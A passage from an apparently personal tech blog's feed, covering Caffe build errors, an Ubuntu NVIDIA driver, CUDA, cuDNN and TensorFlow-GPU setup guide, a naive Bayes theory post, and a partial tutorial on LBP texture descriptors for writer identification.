/usr/bin/ld: cannot find -lcblas
/usr/bin/ld: cannot find -latlas
collect2: error: ld returned 1 exit status
Makefile:572: recipe for target &#39;.build_release/lib/libcaffe.so.1.0.0&#39; failed
make: *** [.build_release/lib/libcaffe.so.1.0.0] Error 1
</code></pre><p>Please see opencv 3 installation tutorial:<br><a href="https://www.learnopencv.com/install-opencv3-on-ubuntu/" target="_blank" rel="external">https://www.learnopencv.com/install-opencv3-on-ubuntu/</a></p>
<h2 id="4-6-numpy-not-found"><a href="#4-6-numpy-not-found" class="headerlink" title="4.6 numpy not found"></a>4.6 numpy not found</h2><p>Error description:</p>
<pre><code>CXX/LD -o python/caffe/_caffe.so python/caffe/_caffe.cpp
python/caffe/_caffe.cpp:10:31: fatal error: numpy/arrayobject.h: No such file or directory
compilation terminated.
Makefile:501: recipe for target &#39;python/caffe/_caffe.so&#39; failed
make: *** [python/caffe/_caffe.so] Error 1
</code></pre><p>First, check if you have installed numpy:</p>
<pre><code>sudo pip install numpy
</code></pre><p>If still error, this seems to be a configuration file problem, we need to edit <code>Makefile.config</code> from</p>
<pre><code>PYTHON_INCLUDE := /usr/include/python2.7 \
    /usr/lib/python2.7/dist-packages/numpy/core/include
</code></pre><p>to this:</p>
<pre><code>PYTHON_INCLUDE := /usr/include/python2.7 \
    /usr/local/lib/python2.7/dist-packages/numpy/core/include
</code></pre><hr>
<h1 id="5-Reference"><a href="#5-Reference" class="headerlink" title="5.Reference"></a>5.Reference</h1><ul>
<li><a href="http://caffe.berkeleyvision.org/install_apt.html" target="_blank" rel="external">Caffe home page, Ubuntu Installation</a></li>
<li><a href="https://chunml.github.io/ChunML.github.io/project/Installing-Caffe-CPU-Only/" target="_blank" rel="external">Installing Caffe on Ubuntu (CPU-ONLY)</a></li>
<li><a href="https://www.learnopencv.com/install-opencv3-on-ubuntu/" target="_blank" rel="external">Install OpenCV3 on Ubuntu</a></li>
<li><a href="http://homeway.me/2017/08/08/setup-gpu-for-tensorflow/">Deep Learning - Setup GPU for tensorflow</a></li>
<li><a href="https://github.com/google/glog/wiki/Installing-Glog-on-Ubuntu-14.04" target="_blank" rel="external">Installing Glog on Ubuntu 14.04</a></li>
</ul>
<hr>
<h4 id="本文出自-夏日小草-转载请注明出处-http-homeway-me-2018-01-25-setup-caffe-for-deep-learning"><a href="#本文出自-夏日小草-转载请注明出处-http-homeway-me-2018-01-25-setup-caffe-for-deep-learning" class="headerlink" title="本文出自 夏日小草,转载请注明出处:http://homeway.me/2018/01/25/setup-caffe-for-deep-learning/"></a>本文出自 <a href="http://homeway.me">夏日小草</a>,转载请注明出处:<a href="http://homeway.me/2018/01/25/setup-caffe-for-deep-learning/">http://homeway.me/2018/01/25/setup-caffe-for-deep-learning/</a></h4><blockquote>
<p>by grasses 2018.01.25</p>
</blockquote>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[Deep Learning - Setup GPU for tensorflow]]></title>
      <url>http://homeway.me/2017/08/08/setup-gpu-for-tensorflow/</url>
      <content type="html"><![CDATA[<p><br></p>
<p><img src="https://static.blog.homeway.me/blog/logo/cudnn-logo.png" alt="Nvidia"></p>
<a id="more"></a>
<p>The following explains how to setup tensorflow GPU environment on 64-bit Ubuntu 17.04 Linux.<br>Following the steps, I will show how to install Nvidia drivers, Nvidia toolkit, CudNN and tensorflow.</p>
<h1 id="1-Nvidia-driver"><a href="#1-Nvidia-driver" class="headerlink" title="1. Nvidia driver"></a>1. Nvidia driver</h1><p>Install Nvidia driver for graphic card GeForce GTX 1070.</p>
<h3 id="1-1-Download-driver"><a href="#1-1-Download-driver" class="headerlink" title="1.1. Download driver"></a>1.1. Download driver</h3><p>First of all, you need to choose specific version and download Nvidia drivers from <a href="http://www.nvidia.com/Download/index.aspx?lang=en" target="_blank" rel="external">Nvidia home page</a>.<br>Here I choose version of 384.59:</p>
<pre><code>NVIDIA-Linux-x86_64-384.59.run
</code></pre><h3 id="1-2-Install-dependency"><a href="#1-2-Install-dependency" class="headerlink" title="1.2. Install dependency"></a>1.2. Install dependency</h3><p>Second, you need to install dependency environment for Nvidia drivers:</p>
<pre><code>sudo apt-get update
sudo apt-get install dkms build-essential linux-headers-generic
</code></pre><p>Add <code>nouveau</code> into black list:</p>
<pre><code>sudo mkdir /etc/modprobe.d/
sudo touch /etc/modprobe.d/blacklist-nouveau.conf
cat &gt;&gt; /etc/modprobe.d/blacklist-nouveau.conf &lt;&lt; EOF
blacklist nouveau
blacklist lbm-nouveau
options nouveau modeset=0
alias nouveau off
alias lbm-nouveau off
EOF
</code></pre><p>Run it to forbiddent <code>nouveau</code>:</p>
<pre><code>echo options nouveau modeset=0 | sudo tee -a /etc/modprobe.d/nouveau-kms.conf
sudo update-initramfs -u
</code></pre><p>Then restart your ubuntu:</p>
<pre><code>sudo reboot
</code></pre><h3 id="1-3-Install-Nvidia-drivers"><a href="#1-3-Install-Nvidia-drivers" class="headerlink" title="1.3. Install Nvidia drivers"></a>1.3. Install Nvidia drivers</h3><p>Before installing, you need to stop ubuntu gui:</p>
<pre><code>sudo service lightdm stop
</code></pre><p>OK, install it and reboot your machine:</p>
<pre><code>sudo chmod u+x NVIDIA-Linux-x86_64-390.77.run
sudo ./NVIDIA-Linux-x86_64-390.77.run
sudo reboot
</code></pre><p>After restart ubuntu, we can test it:</p>
<pre><code>➜  $ nvidia-smi
Tue Aug  8 22:40:47 2017
+-----------------------------------------------------------------------------+
| NVIDIA-SMI 375.66                 Driver Version: 375.66                    |
|-------------------------------+----------------------+----------------------+
| GPU  Name        Persistence-M| Bus-Id        Disp.A | Volatile Uncorr. ECC |
| Fan  Temp  Perf  Pwr:Usage/Cap|         Memory-Usage | GPU-Util  Compute M. |
|===============================+======================+======================|
|   0  GeForce GTX 1070    Off  | 0000:01:00.0     Off |                  N/A |
|  0%   41C    P0    35W / 180W |      0MiB /  8112MiB |      3%      Default |
+-------------------------------+----------------------+----------------------+

+-----------------------------------------------------------------------------+
| Processes:                                                       GPU Memory |
|  GPU       PID  Type  Process name                               Usage      |
|=============================================================================|
|  No running processes found                                                 |
+-----------------------------------------------------------------------------+
</code></pre><p>OK, this result suggests our Nvidia drivers installed successfully.</p>
<hr>
<h1 id="2-Nvidia-toolkit-amp-cuDNN"><a href="#2-Nvidia-toolkit-amp-cuDNN" class="headerlink" title="2. Nvidia toolkit &amp; cuDNN"></a>2. Nvidia toolkit &amp; cuDNN</h1><p>Nvidia toolkit is a base sdk for cuda, and you can download it from: <a href="https://developer.nvidia.com/cuda-downloads" target="_blank" rel="external">https://developer.nvidia.com/cuda-downloads</a><br>For the more, we need CudNN for tensorflow deep learning, and download it from: <a href="https://developer.nvidia.com/rdp/cudnn-download" target="_blank" rel="external">https://developer.nvidia.com/rdp/cudnn-download</a></p>
<h3 id="2-1-Download-cuda"><a href="#2-1-Download-cuda" class="headerlink" title="2.1 Download cuda"></a>2.1 Download cuda</h3><p>Here I choose local deb package <code>cuda-repo-ubuntu1604-9-0-local_9.0.176-1_amd64.deb</code>:<br><img src="https://static.blog.homeway.me/blog/image/2017-08-08-GPU-cuda.png" alt="cuda installation version"></p>
<h3 id="2-2-Install-cuda"><a href="#2-2-Install-cuda" class="headerlink" title="2.2 Install cuda"></a>2.2 Install cuda</h3><p>Following cuda installation command lines:</p>
<pre><code>sudo dpkg -i cuda-repo-ubuntu1604-9-0-local_9.0.176-1_amd64.deb
sudo apt-key add /var/cuda-repo-9-0-local/7fa2af80.pub
sudo apt-get update
sudo apt-get install cuda -y
</code></pre><p>Update cuda environment variables by appending conf after <code>~/.profile</code>:</p>
<pre><code>CUDA_HOME=/usr/local/cuda-8.0
ln -vfs $CUDA_HOME /usr/local/cuda
cat &gt;&gt; ~/.profile &lt;&lt; EOF
export CUDA_HOME=${CUDA_HOME}
export LD_LIBRARY_PATH=${CUDA_HOME}/lib64 
PATH=${CUDA_HOME}/bin:${PATH} 
EOF
source ~/.profile
</code></pre><h3 id="2-3-Testing-cuda"><a href="#2-3-Testing-cuda" class="headerlink" title="2.3 Testing cuda"></a>2.3 Testing cuda</h3><p>Cuda package include a lot testing sample, just make a test for installation, this is my terminal returns:</p>
<pre><code>➜ $ cd $CUDA_HOME/samples/1_Utilities/deviceQuery
➜ $ make 
➜ $ ./deviceQuery
./deviceQuery Starting...

 CUDA Device Query (Runtime API) version (CUDART static linking)

Detected 1 CUDA Capable device(s)

Device 0: &quot;GeForce GTX 1070&quot;
......
</code></pre><p>OK, this result suggests our Nvidia toolkit installed successfully.</p>
<h3 id="2-4-Download-CudNN"><a href="#2-4-Download-CudNN" class="headerlink" title="2.4 Download CudNN"></a>2.4 Download CudNN</h3><p>At first, I choose to download lastest pckage of CudNN: <code>cuDNN v7.0 (August 3, 2017), for CUDA 9.0 RC</code>,<br>but I find it doesn’t work at all, my tensorflow can’t find my gpu,<br>then I try <code>cuDNN v5.1 (Jan 20, 2017), for CUDA 8.0</code> instead.</p>
<p><img src="https://static.blog.homeway.me/blog/image/2017-08-08-setup-GPU-cudnn-ubuntu.png.crdownload.png" alt="CudNN version"></p>
<h3 id="2-5-Install-CudNN"><a href="#2-5-Install-CudNN" class="headerlink" title="2.5 Install CudNN"></a>2.5 Install CudNN</h3><p>To install CudNN, download cudNN v5.0 for Cuda 8.0 from Nvidia website and extract into <code>/usr/local/cuda</code> via:</p>
<pre><code>tar xzvf cudnn-8.0-linux-x64-v5.1.tgz
sudo cp cuda/include/cudnn.h /usr/local/cuda/include
sudo cp cuda/lib64/libcudnn* /usr/local/cuda/lib64
sudo chmod a+r /usr/local/cuda/include/cudnn.h /usr/local/cuda/lib64/libcudnn*
</code></pre><hr>
<h1 id="3-Tensorflow"><a href="#3-Tensorflow" class="headerlink" title="3. Tensorflow"></a>3. Tensorflow</h1><p>After checking Nvidia drivers, Nvidia toolkit, CudNN installed successfully,<br>we now start to install tensorflow-gpu, guide from: <a href="https://www.tensorflow.org/install/install_linux" target="_blank" rel="external">https://www.tensorflow.org/install/install_linux</a></p>
<h3 id="3-1-Install-dependency"><a href="#3-1-Install-dependency" class="headerlink" title="3.1. Install dependency"></a>3.1. Install dependency</h3><p>Before installation, make sure everything is ok for ubuntu python dependency:</p>
<pre><code class="bash"># From： https://www.tensorflow.org/install/install_linux

sudo apt-get install python-dev python3-dev python-numpy \
 python3-numpy python-six python3-six build-essential python-pip python3-pip -y

# Adds NVIDIA package repository.
sudo apt-key adv --fetch-keys http://developer.download.nvidia.com/compute/cuda/repos/ubuntu1604/x86_64/7fa2af80.pub
wget http://developer.download.nvidia.com/compute/cuda/repos/ubuntu1604/x86_64/cuda-repo-ubuntu1604_9.1.85-1_amd64.deb
wget http://developer.download.nvidia.com/compute/machine-learning/repos/ubuntu1604/x86_64/nvidia-machine-learning-repo-ubuntu1604_1.0.0-1_amd64.deb
sudo dpkg -i cuda-repo-ubuntu1604_9.1.85-1_amd64.deb
sudo dpkg -i nvidia-machine-learning-repo-ubuntu1604_1.0.0-1_amd64.deb
sudo apt-get update

# Includes optional NCCL 2.x.
sudo apt-get install cuda9.0 cuda-cublas-9-0 cuda-cufft-9-0 cuda-curand-9-0 \
  cuda-cusolver-9-0 cuda-cusparse-9-0 libcudnn7=7.1.4.18-1+cuda9.0 \
   libnccl2=2.2.13-1+cuda9.0 cuda-command-line-tools-9-0

# Optionally install TensorRT runtime, must be done after above cuda install.
sudo apt-get update
sudo apt-get install libnvinfer4=4.1.2-1+cuda9.0
</code></pre>
<h3 id="3-2-Install-tensorflow"><a href="#3-2-Install-tensorflow" class="headerlink" title="3.2. Install tensorflow"></a>3.2. Install tensorflow</h3><pre><code>sudo pip install tensorflow tensorflow-gpu
</code></pre><h3 id="3-3-Testing-tensorflow"><a href="#3-3-Testing-tensorflow" class="headerlink" title="3.3 Testing tensorflow"></a>3.3 Testing tensorflow</h3><p>Let’s write a sample code for tensorflow with gpu:</p>
<pre><code># Creates a graph.
with tf.device(&#39;/gpu:0&#39;):
    a = tf.constant([1.0, 2.0, 3.0, 4.0, 5.0, 6.0], shape=[2, 3], name=&#39;a&#39;)
    b = tf.constant([1.0, 2.0, 3.0, 4.0, 5.0, 6.0], shape=[3, 2], name=&#39;b&#39;)
c = tf.matmul(a, b)
# Creates a session with log_device_placement set to True.
sess = tf.Session(config=tf.ConfigProto(allow_soft_placement=True, log_device_placement=True))
sess.run(tf.global_variables_initializer())
# Runs the op.
print(sess.run(c))
</code></pre><p>You should see the following output:</p>
<pre><code>Device mapping:
/job:localhost/replica:0/task:0/gpu:0 -&gt; device: 0, name: Tesla K40c, pci bus
id: 0000:05:00.0
b: /job:localhost/replica:0/task:0/gpu:0
a: /job:localhost/replica:0/task:0/gpu:0
MatMul: /job:localhost/replica:0/task:0/gpu:0
[[ 22.  28.]
 [ 49.  64.]]
</code></pre><p>Example from: <a href="https://www.tensorflow.org/tutorials/using_gpu" target="_blank" rel="external">https://www.tensorflow.org/tutorials/using_gpu</a></p>
<hr>
<h1 id="4-Reference"><a href="#4-Reference" class="headerlink" title="4. Reference"></a>4. Reference</h1><ul>
<li><a href="https://gist.github.com/dangbiao1991/7825db1d17df9231f4101f034ecd5a2b" target="_blank" rel="external">Ubuntu 16.04 安装英伟达（Nvidia）显卡驱动</a></li>
<li><a href="https://alliseesolutions.wordpress.com/2016/09/08/install-gpu-tensorflow-from-sources-w-ubuntu-16-04-and-cuda-8-0/" target="_blank" rel="external">Install GPU TensorFlow From Sources w/ Ubuntu 16.04 and Cuda 8.0</a></li>
<li><a href="https://www.tensorflow.org/install/install_linux" target="_blank" rel="external">https://www.tensorflow.org/install/install_linux</a></li>
<li><a href="https://www.tensorflow.org/tutorials/using_gpu" target="_blank" rel="external">https://www.tensorflow.org/tutorials/using_gpu</a></li>
</ul>
<hr>
<h4 id="本文出自-夏日小草-转载请注明出处-http-homeway-me-2017-08-08-setup-gpu-for-tensorflow"><a href="#本文出自-夏日小草-转载请注明出处-http-homeway-me-2017-08-08-setup-gpu-for-tensorflow" class="headerlink" title="本文出自 夏日小草,转载请注明出处:http://homeway.me/2017/08/08/setup-gpu-for-tensorflow/"></a>本文出自 <a href="http://homeway.me">夏日小草</a>,转载请注明出处:<a href="http://homeway.me/2017/08/08/setup-gpu-for-tensorflow/">http://homeway.me/2017/08/08/setup-gpu-for-tensorflow/</a></h4><blockquote>
<p>by grasses 2017.08.08</p>
</blockquote>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[Machine Learning - Naive Bayesian theory]]></title>
      <url>http://homeway.me/2017/05/22/machine-learning-naive-bayesian/</url>
      <content type="html"><![CDATA[<p><br></p>
<p><img src="https://static.blog.homeway.me/blog/machine-learning-logox.png" alt="Machine Learning"></p>
<a id="more"></a>
<h1 id="About"><a href="#About" class="headerlink" title="About"></a>About</h1><h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>Bayes’ rule is a rigorous method for interpreting evidence in the context of previous experience or knowledge. It was discovered by Thomas Bayes (c. 1701-1761), and independently discovered by Pierre-Simon Laplace (1749-1827).</p>
<p>The Naive Bayes algorithm is called “naive” because it makes the assumption that the occurrence of a certain feature is independent of the occurrence of other features.</p>
<p>In naive bayesian, it`s diffcultly to predict posterior probability, and we can use proior probability p(x|y) to consider posterior probability:</p>
<p><img src="https://static.blog.homeway.me/blog/2017-05-22-naive-bayesian-figure-1.png" alt="Figure-1: Naive Bayesian model"></p>
<p>After this section, we begin talking about how this bayesian work.</p>
<h2 id="Bayesian-decision-theory"><a href="#Bayesian-decision-theory" class="headerlink" title="Bayesian decision theory"></a>Bayesian decision theory</h2><p>Suppose n labels defined as <code>Y = {y1, y2, y3, y4...yn}</code>, <code>λij</code> defined as loss probability for wrongly classing yj as yi. After this we can get a conditional risk <code>R(yi | x)</code>: on condition x, probability for wrongly class yj as yi:</p>
<p><img src="https://static.blog.homeway.me/blog/2017-05-22-naive-bayesian-formula-1.png" alt="Formula1: Error risk on condition x"></p>
<p>Make a mathematical expectation:</p>
<p><img src="https://static.blog.homeway.me/blog/2017-05-22-naive-bayesian-formula-2.png" alt="Formula2: Error risk expectation"></p>
<p>To make E(h(x)) more smaller, we need to find a group of <code>{X -&gt; Y}</code> which make <code>R(h(x)|x)</code> mathematical expectation smallest. The smallest h(x) is called Bayes optiomal classifier. <code>λij</code> can be defined as:</p>
<p><img src="https://static.blog.homeway.me/blog/2017-05-22-naive-bayesian-formula-3.png" alt="Formula-3: λij"></p>
<p>Error risk probability:</p>
<p><img src="https://static.blog.homeway.me/blog/2017-05-22-naive-bayesian-formula-4.png" alt="Formula-4: risk probability"></p>
<p>Where <code>P(yi|x)</code> is accurate judgment probability, and Bayes optiomal classifier can be defined as:</p>
<p><img src="https://static.blog.homeway.me/blog/2017-05-22-naive-bayesian-formula-5.png" alt="Formula-5: h(x)"></p>
<p>From here, we can make a conclusion: in order to make classfy risk more smaller, we need to find max mathematical expectation for P(y|x), but mostly, find bigest <code>P(y | x)</code> is not easy work, in bayesian theory:</p>
<p><img src="https://static.blog.homeway.me/blog/2017-05-22-naive-bayesian-formula-6.png" alt="Formula-6: bayesian formula"></p>
<p>Where <code>P(y)</code> is prior probability, <code>P(x|y)</code> is on condition y probability(likehood).</p>
<h2 id="Maximum-Likelihood-Estimator-MLE"><a href="#Maximum-Likelihood-Estimator-MLE" class="headerlink" title="Maximum Likelihood Estimator (MLE)"></a>Maximum Likelihood Estimator (MLE)</h2><p>In statistics, maximum likelihood estimation (MLE) is a method of estimating the parameters of a statistical model given observations, by finding the parameter values that maximize the likelihood of making the observations given the parameters.(<a href="https://en.wikipedia.org/wiki/Maximum_likelihood_estimation" target="_blank" rel="external">Wiki: https://en.wikipedia.org/wiki/Maximum_likelihood_estimation</a>)</p>
<p>Without considering any prior opinion, a typical approach for estimating p is the method of maximum likelihood. For <code>xi ∈ X (i = 1,2,3,4...)</code>, all xi independent and with same distribution, then <code>P(Xi=xi|θ)</code> should be:</p>
<p><img src="https://static.blog.homeway.me/blog/2017-05-22-naive-bayesian-formula-7.png" alt="Formula-7: Likelihood probability"></p>
<p>Now we look at this function from a different perspective by considering the observed values <code>x1, x2, …, xn</code> to be fixed “parameters” of this function, whereas θ will be the function’s variable and allowed to vary freely.In practice the algebra is often more convenient when working with the natural logarithm of the likelihood function, called the log-likelihood:</p>
<p><img src="https://static.blog.homeway.me/blog/2017-05-22-naive-bayesian-formula-8.png" alt="Formula-8:Log-likelihood"></p>
<p>Because log(x) and multiplication function has same incremental decrement attribute, we choose log-likelihood for better caculating.<br>The method of maximum likelihood estimates θ by finding a value of θ that maximizes ln(L(θ)). This method of estimation defines a maximum likelihood estimator (MLE) of θ:</p>
<p><img src="https://static.blog.homeway.me/blog/2017-05-22-naive-bayesian-formula-9.png" alt="Formula-9: Maximum Likelihood Estimator"></p>
<p>In order to find the maximum likelihood function, we need to derive the formula 9, find the derivative is 0 when the θ is the maximum likelihood function solution.</p>
<h2 id="Naive-Bayesian-theory"><a href="#Naive-Bayesian-theory" class="headerlink" title="Naive Bayesian theory"></a>Naive Bayesian theory</h2><p>Ok, let’s go back to naive bayesian.</p>
<p>We may find posterior probability <code>P(y|x)</code> not easy to calculate, but if the conditions are interrelated, we can not from the prior probability (<code>P(x|y)</code>) get the results. Bayesian uses the attribute conditional independence hypothesis, which supposing all conditions x do not affect each other. Based on attribute conditional independence hypothesis, formula 6 can be like:</p>
<p><img src="https://static.blog.homeway.me/blog/2017-05-22-naive-bayesian-formula-10.png" alt="Formula-10: attribute conditional independence hypothesis"></p>
<p>Where X has m attributes, all working independently. Formula 5 can be rewrited as:</p>
<p><img src="https://static.blog.homeway.me/blog/2017-05-22-naive-bayesian-formula-11.png" alt="Formula-11: attribute conditional independence hypothesis"></p>
<p>Here we need to choose a distribution to describe p(x|y) called prior distribution.</p>
<h2 id="Bayesian-prior"><a href="#Bayesian-prior" class="headerlink" title="Bayesian prior"></a>Bayesian prior</h2><p>There are many different bayesian prior: Gaussian or normal distribution, bernoulli distribution, conjugate distributions. Once we have chosen a prior distribution Pr(p)Pr(p), we then observe the process, and use Bayes’ theorem to update our probability distribution appropriately.</p>
<p>For normal distribution:</p>
<p><img src="https://static.blog.homeway.me/blog/2017-05-22-naive-bayesian-formula-12.png" alt="Formula-12: normal distribution bayesian prior"></p>
<p>From attributions of normal distribution, P(x|y) ~ N(u, σ^2), we can now get the estimating mathematical expectation and variance from maximum likelihood:</p>
<p><img src="https://static.blog.homeway.me/blog/2017-05-22-naive-bayesian-formula-14.png" alt="Formula-14: normal distribution mathematical expectation"></p>
<p><img src="https://static.blog.homeway.me/blog/2017-05-22-naive-bayesian-formula-15.png" alt="Formula-15: normal distribution variance"></p>
<blockquote>
<p>Next post I whil write some code to express how naive bayesian works. </p>
</blockquote>
<p><hr><br></p>
<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference:"></a>Reference:</h1><ul>
<li>《机器学习-周志华》</li>
<li>Bayes’ Rule With Python - A Tutorial Introduction to Bayesian Analysis, by James V Stone</li>
<li><a href="https://www.cs.ubc.ca/~murphyk/Papers/bayesGauss.pdf" target="_blank" rel="external">Kevin P. Murphy: Conjugate Bayesian analysis of the Gaussian distribution</a></li>
<li><a href="http://marcharper.codes/2015-08-24/bayesian.html" target="_blank" rel="external">Bayesian Inference for Bernoulli processes: Is that coin fair?</a></li>
<li><a href="https://en.wikipedia.org/wiki/Bernoulli_distribution" target="_blank" rel="external">Wiki Bernoulli: https://en.wikipedia.org/wiki/Bernoulli_distribution</a></li>
<li><a href="https://en.wikipedia.org/wiki/Maximum_likelihood_estimation" target="_blank" rel="external">Wiki Maximum_likelihood: https://en.wikipedia.org/wiki/Maximum_likelihood_estimation</a></li>
</ul>
<p><hr><br></p>
<h4 id="本文出自-夏日小草-转载请注明出处-http-homeway-me-2017-05-22-machine-learning-naive-bayesian"><a href="#本文出自-夏日小草-转载请注明出处-http-homeway-me-2017-05-22-machine-learning-naive-bayesian" class="headerlink" title="本文出自 夏日小草,转载请注明出处:http://homeway.me/2017/05/22/machine-learning-naive-bayesian/"></a>本文出自 <a href="http://homeway.me">夏日小草</a>,转载请注明出处:<a href="http://homeway.me/2017/05/22/machine-learning-naive-bayesian/">http://homeway.me/2017/05/22/machine-learning-naive-bayesian/</a></h4><p>-by grasses</p>
<p>2017-05-22 23:52:34</p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[Pattern - writter identify using texture descriptors]]></title>
      <url>http://homeway.me/2017/05/04/pattern-writer-identify/</url>
      <content type="html"><![CDATA[<p><br></p>
<p><img src="https://static.blog.homeway.me/blog/machine-learning-logox.png" alt="Machine Learning"></p>
<p><hr><br></p>
<a id="more"></a>
<h1 id="About"><a href="#About" class="headerlink" title="About"></a>About</h1><p>This tutorial is about an approach for writer identification using texture descriptors of handwritten fragments. At the begin of all, I may define image analysis = image conversion + digit analysis, where image conversion is to change image from matrix digital to list digital and digit analysis uses machine learning method.</p>
<p><img src="https://static.blog.homeway.me/blog/2017-05-04-writer-identify-figure-1.png" alt="Figure 1: draws from different writters"></p>
<p>Characterizing individual’s handwriting style plays an important role in handwritten document analysis and automatic writer identification has attracted a large number of researchers in the pattern recognition field based on modern handwritten text, musical scores and historical documents. We can learn from figure 1 that different writers have different handwriting style, even for letter ‘l’, well, this gives us a way to use texture descriptors of handwritten fragments identify writer.</p>
<p>We may easily identify writer by texture descriptors following steps:</p>
<pre><code>1.cutting image into pieces of letters
2.resize pieces of letters into NxN piexls
3.convert pieces of letters into digital array
4.using machine learning method(SVM/KNN) identify writter
</code></pre><p><hr><br></p>
<h1 id="Image-Conversion"><a href="#Image-Conversion" class="headerlink" title="Image Conversion"></a>Image Conversion</h1><h2 id="1-Local-Binary-Pattern-LBP"><a href="#1-Local-Binary-Pattern-LBP" class="headerlink" title="1.Local Binary Pattern(LBP)"></a>1.Local Binary Pattern(LBP)</h2><h3 id="3x3-LBP"><a href="#3x3-LBP" class="headerlink" title="3x3 LBP"></a>3x3 LBP</h3><p>Local binary patterns (LBP) is a type of visual descriptor used for classification in computer vision. LBP is the particular case of the Texture Spectrum model proposed in 1990.<a href="https://en.wikipedia.org/wiki/Local_binary_patterns" target="_blank" rel="external">Local binary patterns(wiki): https://en.wikipedia.org/wiki/Local_binary_patterns</a></p>
<p><img src="https://static.blog.homeway.me/blog/2017-05-04-writer-identify-figure-2.png" alt="Figure 2: LBP transform algorithm"></p>
<p>Figure 2 shows how LBP transform algorithm works, with clockwise direction, we define position from 0 to 8, coordinate start at (0, 0), center point coordinate as (1, 1). The LBP operator labels the pixels of an image by thresholding the 3x3 neighborhood of each pixel with the center value and summing the thresholded values weighted by powers of 2. The resulting LBP can be expressed in decimal form as follows:</p>
<p><img src="https://static.blog.homeway.me/blog/2017-05-04-writer-identify-formula-1.png" alt="Formula 1: LBP formula"></p>
<p>where gi and gc are, respectively, gray-level values of the central pixel and i surrounding pixels in the circular neighborhood with a radius R. We compare each point(gi) to the center point pigment(gc), if the color depth is greater than the center point we define it to 1, otherwise it is set to 0, the resulting data is multiplied by 2. And s(x) follows:</p>
<p><img src="https://static.blog.homeway.me/blog/2017-05-04-writer-identify-formula-2.png" alt="Formula 2: LBP s(x) leap formula"></p>
<p>Ok, after Formula 1/2, we may get list of 3x3 blocks, the texture is represented by the histogram of the labels:</p>
<p><img src="https://static.blog.homeway.me/blog/2017-05-04-writer-identify-formula-3.png" alt="Formula 3: LBP histogram"></p>
<p>where δ is the Kronecker delta and is given as:</p>
<p><img src="https://static.blog.homeway.me/blog/2017-05-04-writer-identify-formula-4.png" alt="Formula 4: LBP histogram δ(x, y)"></p>
<p>Figure 3 is an example shows LBP transform, even though right picture lost a lot of pixels detail, it still remain it’s texture descriptors:</p>
<p><img src="https://static.blog.homeway.me/blog/2017-05-04-writer-identify-figure-3.png" alt="Figure 3: Before LBP transform and after LBP transform"></p>
<h3 id="Multiscale-LBP"><a href="#Multiscale-LBP" class="headerlink" title="Multiscale LBP"></a>Multiscale LBP</h3><p>Multiscale LBP is an improvment for 3x3 LBP, where multiscale LBP allow to convert image block by 8x8 or 16x16 pixels. The bigger block may accelerate it’s caculating speed, but also bring the losing of pixels information. See Figure 4 for how it works:</p>
<p><img src="https://static.blog.homeway.me/blog/2017-05-04-writer-identify-figure-4.png" alt="Figure 4: Multiscale LBP transform"></p>
<h3 id="Rotation-LBP"><a href="#Rotation-LBP" class="headerlink" title="Rotation LBP"></a>Rotation LBP</h3><p><img src="https://static.blog.homeway.me/blog/2017-05-04-writer-identify-figure-5.png" alt="Figure 4: Multiscale LBP transform"></p>
<p>Formally, rotation LBP can be achieved by defining:</p>
<p><img src="https://static.blog.homeway.me/blog/2017-05-04-writer-identify-formula-5.png" alt="Formula 5: Rotation LBP"></p>
<p>where ‘d’ is rotation degree, d ∈ (0, 360), and after mapping, we choose minmium value for result value, which is an unique value.</p>
<h3 id="simple-3x3-LBP-coding"><a href="#simple-3x3-LBP-coding" class="headerlink" title="simple 3x3 LBP coding"></a>simple 3x3 LBP coding</h3><p>Gist source code: <a href="https://gist.github.com/grasses/bacbdfae0626353de12cedc4ceaed552" target="_blank" rel="external">https://gist.github.com/grasses/bacbdfae0626353de12cedc4ceaed552</a></p>
<pre><code>import numpy as np
import cv2
from matplotlib import pyplot as plt

def thresholded(center, pixels):
    out = []
        for a in pixels:
    if a &lt; center:
        out.append(0)
    else:
        out.append(1)
    return out

def get_pixel(pixel_list, idx, idy, default = 0):
    try:
        return pixel_list[idx, idy]
    except IndexError:
        return default

def show(img, lbp_img):
    plt.figure(figsize = (8, 8))
    plt.subplot(221)
    plt.title(&quot;original image&quot;)
    plt.imshow(img, cmap=plt.cm.Greys_r)

    plt.subplot(222)
    plt.title(&quot;LBP transform image&quot;)
    plt.imshow(lbp_img, cmap=plt.cm.Greys_r)

    plt.subplot(223)
    (hist, bins) = np.histogram(img.flatten(), 256, [0, 256])
    cdf = hist.cumsum()
    cdf_normalized = cdf * hist.max() / cdf.max()
    plt.plot(cdf_normalized, color = &#39;b&#39;)
    plt.hist(img.flatten(), 256, [0, 256], color = &#39;r&#39;)
    plt.xlim([0, 256])
    plt.legend((&#39;cdf&#39;, &#39;histogram&#39;), loc = &#39;upper left&#39;)

    plt.show()

def main(fpath):
    img = cv2.imread(fpath, cv2.IMREAD_GRAYSCALE)
    lbp_img = cv2.imread(fpath, cv2.IMREAD_GRAYSCALE)

    offset = [(-1, -1), (0, -1), (1, -1), (1, 0), (-1, 0), (-1, 1), (1, 1), (0, 1)]
    for x in range(len(img)):
        for y in range(len(img[x])):
            matrix = []
            for z in range(len(offset)):
                matrix.append(get_pixel(img, x + offset[z][0], y + offset[z][1]))
            center = img[x, y]
            # get thresholded 0101 value
            values = thresholded(center, matrix)
            weights = [1, 2, 4, 8, 16, 32, 64, 128]
            # add thresholded weight
            res = 0
            for a in range(len(values)):
                res += weights[a] * values[a]
            lbp_img.itemset((x,y), res)
    show(img, lbp_img)

if __name__ == &#39;__main__&#39;:
    main(r&#39;/path/to/img&#39;)
</code></pre><p><hr><br></p>
<h2 id="2-Local-Ternary-Patterns-LTP"><a href="#2-Local-Ternary-Patterns-LTP" class="headerlink" title="2.Local Ternary Patterns(LTP)"></a>2.Local Ternary Patterns(LTP)</h2><p>Local Ternary Patterns(LTP) is an advance version algrithm of LBP, which introduces gradient function for block transform.</p>
<p><img src="https://static.blog.homeway.me/blog/2017-05-04-writer-identify-figure-6.png" alt="Figure 6: Multiscale LTP transform"></p>
<p>From figure 6, with clockwise direction, we define position from 0 to 8, coordinate start at <code>(0, 0)</code>, center point coordinate as <code>(1, 1)</code>. With 3 gradients, (0, 30 - t), (30 - t, 30 + t), (30 + t, 256), follows 3 result value: -1, 0, 1. As is shown in picture, when <code>t = 5</code>:</p>
